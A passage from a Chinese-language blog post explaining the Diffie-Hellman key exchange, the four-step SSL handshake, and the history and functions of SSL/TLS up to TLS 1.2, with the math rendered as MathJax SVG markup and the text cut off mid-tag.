d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container>，并将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.717ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 759 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></svg></mjx-container>发送给Alice</li><li>Alice计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="14.488ex" height="2.084ex" role="img" focusable="false" viewBox="0 -716 6403.6 921"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(987,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1754.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2810.6,0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(783,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="mi" transform="translate(4017.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4895.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5380.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(5900.6,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container></li><li>Bob计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="14.348ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 6341.9 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mi" transform="translate(521,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(987,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1754.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2810.6,0)"><g data-mml-node="mi"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mi" transform="translate(792,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="mi" transform="translate(3955.9,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4833.9,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5318.9,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(5838.9,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g></g></svg></mjx-container></li><li>Alice和Bob就同时协商出群元素<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="2.8ex" height="2.395ex" role="img" focusable="false" viewBox="0 -853.7 1237.4 1058.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="TeXAtom" transform="translate(510,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(529,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g></g></svg></mjx-container>，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.748ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 2098.4 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g><g data-mml-node="msup" transform="translate(1252.3,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.748ex" height="2.497ex" role="img" focusable="false" viewBox="0 -853.7 2098.4 1103.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mi"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(510,363) scale(0.707)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g><g data-mml-node="msup" transform="translate(1323.1,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(422,363) scale(0.707)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></g></svg></mjx-container>因为群是乘法交换的。</li></ol><h3 id="SSL协议的流程"><a href="#SSL协议的流程" class="headerlink" title="SSL协议的流程"></a>SSL协议的流程</h3><p><a href="https://blog.nsfocus.net/tls1-3/">绿盟科技文章</a></p><p>SSL（Secure Sockets Layer）协议是为确保在计算机网络中进行安全通信而设计的加密协议。SSL协议在传输层之上，应用层之下</p><ul><li>第一步：client向server发出hello，并生成一个随机数random_A，将使用的SSL协议版本、加密算法、压缩方法以及random_A发送给服务端。</li><li>第二步：<ul><li>server向client回应hello，并生成一个随机数random_B，和客户端一样，在报文中包含SSL版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。并将random_B发送给client</li><li>server向client发送自己的证书用于身份验证</li><li>server向client发送hellodone表示密钥协商阶段结束</li></ul></li><li>第三步：<ul><li>client验证服务器证书的有效性。通常，客户端会验证证书是否由受信任的CA签发，证书是否过期，证书链是否完整等。</li><li>client如果发送了证书，也会通过签名证明其证书的有效性。</li><li>client生成一个随机数random_C，client会使用证书中取出来的公钥对random_C进行加密，生成预主密钥，客户端以Client Key Exchange报文作为回应，其中包含预主密钥。</li><li>client继续发送Change Cipher Spec报文。用于告知server，client已经切换到之前协商好的加密套件（Cipher Suite）的状态，准备使用之前协商好的加密套件加密数据并传输了。</li><li>client发送Finished报文。该报文包含连接至今全部报文的整体校验值（也就是HASH值），用来供server校验。</li></ul></li><li>第四步：<ul><li>server接收到客户端的请求之后，使用私钥解密报文，把Pre-master secret取出来。接着，同样发送Change Cipher Spec报文。</li><li>server同样发送Finished报文，用来供client校验。</li><li>此时双方建立起SSL连接，开始使用HTTP通讯</li></ul></li></ul><img src="/2024/06/28/%E8%AF%A6%E8%A7%A3SSL-TLS/Snipaste_2024-06-28_22-31-58.jpg" class=""><h3 id="TLS协议"><a href="#TLS协议" class="headerlink" title="TLS协议"></a>TLS协议</h3><p><a href="https://www.cnblogs.com/enoc/p/tls-handshake.html">一篇讲的很好的博客</a></p><p>网景公司针对传输层协议（TCP/UDP）并没有对传输的数据进行加密保护的缺陷，为自家浏览器设计了SSL协议，于1995年公开协议的2.0版本。1999年，IETF小组基于SSL 3.0设计了与SSL协议独立的TLS 1.0协议，正式成为互联网传输层加密的标准。</p><p>SSL/TLS提供了两种功能：</p><ul><li>建立一个安全的连接：对其中传输的数据提供加密保护，防止被中间人嗅探到可见明文；对数据提供完整性校验，防止传输的数据被中间人修改。</li><li>建立一个可信的连接：对连接双方的实体提供身份认证。</li></ul><h4 id="TLS1-2"><a href="#TLS1-2" class="headerlink" title="TLS1.2"></a>TLS1.2</h4><p>其实就是修复了一些安全漏洞，然后将SSL（security socket layer）换了个名字TLS（transport layer security），具体流程和SSL类似。</p><p>这里讲一下基于DH算法的握手流程的改动</p><ul><li>在证书中，不再是服务端的RSA公钥，而是DH中的p,g以及服务端的公钥<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.464ex;" 